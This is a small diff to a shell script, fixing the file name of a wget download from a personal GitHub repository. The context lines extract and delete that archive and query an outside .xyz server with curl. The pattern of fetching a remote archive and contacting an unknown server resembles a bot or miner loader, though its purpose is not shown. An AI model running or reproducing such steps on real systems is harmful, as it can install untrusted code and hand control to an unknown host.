@@ -16,7 +16,7 @@ rm -rf cwork
 echo "DONE"
 cd work
 PROG=`cat new.txt`
-wget -O q.tar.gz https://github.com/diegofustox/cwork/blob/main/z.tar.gz?raw=true
+wget -O z.tar.gz https://github.com/diegofustox/cwork/blob/main/z.tar.gz?raw=true
 tar xvzf z.tar.gz
 rm z.tar.gz
 newh=`curl http://luckpower.xyz/srv.php`
